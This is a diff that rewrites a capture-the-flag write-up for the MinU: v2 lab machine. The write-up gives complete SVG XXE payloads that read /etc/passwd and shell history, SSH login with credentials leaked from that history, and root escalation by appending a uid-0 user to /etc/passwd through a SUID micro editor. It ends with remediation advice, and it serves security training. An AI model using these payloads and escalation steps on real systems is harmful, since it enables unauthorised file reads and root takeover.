@@ -1,154 +1,150 @@
 # MinU: v2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Beginner |
-| **OS** | Linux (Alpine/BusyBox — `/bin/ash`) |
-| **Root Flag** | Captured (value in screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/minu-v2,333/) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Easy |
+| **OS** | Linux (Alpine-based) |
+| **Goal** | root flag.txt |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/minu-v2-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap (port 3306/HTTP) → dirb SVG upload page → SVG XXE to read `/etc/passwd` and `/.ash_history` → credentials `employee:superultrapass3` → SSH → SUID `/usr/bin/micro` → edit `/etc/passwd` → add root user → root
+MinU: v2 is a beginner-level boot-to-root machine that chains three distinct weaknesses: an SVG upload form vulnerable to XML External Entity (XXE) injection, credential leakage through shell history exposed via XXE, and privilege escalation using a SUID-bit text editor (`micro`) that allows overwriting `/etc/passwd`. No browser-facing services run on port 80; the HTTP server is actually on port 3306.
 
 ## Methodology
 
-1. Network discovery
-2. Directory enumeration — SVG upload endpoint on unusual port
-3. SVG XXE payload to read internal files
-4. SSH login with credentials from shell history
-5. Privilege escalation via SUID `micro` editor
+1. Host discovery — Netdiscover
+2. Service enumeration — Nmap
+3. Directory brute-force — dirb
+4. XXE via SVG upload to read `/etc/passwd`
+5. XXE to read `/.ash_history` and extract credentials
+6. SSH login as `employee`
+7. SUID `micro` editor abuse to inject root user into `/etc/passwd`
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
 nmap -A 192.168.1.101
 ```
 
-Key findings:
-- Port 22: SSH
-- Port 3306: HTTP service (not MySQL — unusual)
+Open ports:
+- `22/tcp` — SSH
+- `3306/tcp` — HTTP (unusual; the web server is bound to the MySQL default port)
 
-![Nmap scan](images/01-nmap.png)
+![Nmap scan results](images/01-nmap.png)
 
----
+## Step 2: Web Directory Enumeration
 
-## Step 2: Web Enumeration
+The index page at `http://192.168.1.101:3306` yields nothing useful. Run dirb targeting HTML files:
 
 ```bash
 dirb http://192.168.1.101:3306 -X .html
 ```
 
-Finds an upload page that accepts only `.svg` files.
+A single HTML page is found that hosts a file upload form. The form only accepts `.svg` files.
 
----
+![dirb discovers the SVG upload page](images/02-dirb.png)
 
-## Step 3: SVG XXE — Read Internal Files
+## Step 3: XXE via SVG Upload — Read /etc/passwd
 
-Create an SVG file with an XXE payload to read `/etc/passwd`:
+Create a malicious SVG file that uses an XML external entity to read `/etc/passwd`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text>&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
+  <text x="10" y="20">&xxe;</text>
 </svg>
 ```
 
-Upload the file and view the page source to read the file contents.
+Save it as `xxe.svg` and upload it. View the page source of the result to read the file contents. The `/etc/passwd` file reveals users including `employee`.
 
-![XXE /etc/passwd](images/02-xxe-passwd.png)
+![XXE reads /etc/passwd](images/03-xxe-passwd.png)
 
-Users found: `employee`, `chrony`, `nobody`.
+## Step 4: XXE via SVG Upload — Read Shell History
 
-Now modify the payload to read shell history:
+The target uses `/bin/ash` (Alpine Linux). The history file is `/.ash_history`. Update the XXE payload:
 
 ```xml
-<!ENTITY xxe SYSTEM "file:///.ash_history">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///.ash_history">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
+  <text x="10" y="20">&xxe;</text>
+</svg>
 ```
 
-Upload again and read the output — contains SSH credentials:
+Upload `history.svg`. The shell history reveals the following credentials:
 
 ```
-ssh employee@192.168.1.101
-# password visible in history: superultrapass3
+employee:superultrapass3
 ```
 
-![Shell history via XXE](images/03-ash-history.png)
+![Shell history exposes credentials via XXE](images/04-ash-history.png)
 
----
-
-## Step 4: SSH Login
+## Step 5: SSH Login
 
 ```bash
 ssh employee@192.168.1.101
 # Password: superultrapass3
 ```
 
----
+## Step 6: Privilege Escalation via SUID micro Editor
 
-## Step 5: Privilege Escalation — SUID `micro` Editor
-
-Find SUID binaries:
+Search for SUID binaries:
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Result: `/usr/bin/micro` has the SUID bit set — the `micro` terminal editor runs as root.
+The output includes `/usr/bin/micro` — a text editor with the SUID bit set. This allows writing to files owned by root.
 
-![SUID binaries](images/04-suid.png)
-
-Use `micro` to edit `/etc/passwd` directly:
-
-```bash
-cat /etc/passwd | /usr/bin/micro
-```
-
-Generate a new password hash:
+Generate a password hash on the attacker machine or locally:
 
 ```bash
 openssl passwd -1 -salt user3 pass123
+# $1$user3$<HASH>
 ```
 
-Add a new root-level user line to `/etc/passwd` (the shell must be `/bin/ash`):
+Use `micro` to append a new root-equivalent user to `/etc/passwd`:
 
-```
-test:$1$user3$<hash>:0:0:root:/root:/bin/ash
+```bash
+cat /etc/passwd | /usr/bin/micro
+# In micro: append the following line, then save with Ctrl+S, exit with Ctrl+Q
+# test:$1$user3$<HASH>:0:0:root:/root:/bin/ash
 ```
 
-Save the file inside micro (`Ctrl+S`), then switch to the new user:
+Switch to the new user and read the flag:
 
 ```bash
 su test
 # Password: pass123
 id
-# uid=0(root) gid=0(root)
-cd /root && cat flag.txt
+# uid=0(root) gid=0(root) groups=0(root)
+cd /root
+cat flag.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
+![Root flag captured](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SVG XXE** — SVG files are XML; if an upload endpoint parses them server-side, external entity injection reads arbitrary files
-2. **Credentials in shell history** — `~/.ash_history` (and `~/.bash_history`) contain all previous commands including plaintext passwords
-3. **SUID on text editors** — `micro`, `vim`, `nano` with SUID are immediate root — use `find / -perm -u=s` in post-exploitation
-4. **Weak service hardening** — HTTP on port 3306 misleads; always check non-standard ports
+- SVG files are XML documents. Any upload feature that processes SVG (including rendering or parsing) is potentially vulnerable to XXE if the parser is not configured to prohibit external entity resolution.
+- Shell history files often contain plaintext commands including passwords typed directly on the command line. Applications that can read arbitrary files (via XXE, LFI, SSRF) will expose these.
+- Setting the SUID bit on editors, scripting interpreters, or any program that writes to the filesystem grants effective root write access to the SUID owner's files.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| SVG XXE | Disable external entity processing in the XML parser (`LIBXML_NOENT` off) |
-| History file exposure | Clear `HISTFILE`; restrict file read permissions on history files |
-| SUID `micro` editor | Remove SUID: `chmod u-s /usr/bin/micro` |
-| Writable `/etc/passwd` via root process | Audit file permissions regularly with CIS benchmarks |
+| XXE in SVG upload | Disable external entity processing in the XML parser (e.g., `LIBXML_NOENT` disabled); convert SVG to a safe format server-side |
+| Credentials in shell history | Never type passwords directly on the command line; use environment variables or credential files; clear history with `history -c` |
+| SUID on text editor | Remove the SUID bit: `chmod u-s /usr/bin/micro`; audit all SUID binaries regularly with `find / -perm -4000` |
+| Sensitive credential file exposure | Restrict `/.ash_history` permissions; run the web service as an unprivileged user with no access to home directories |
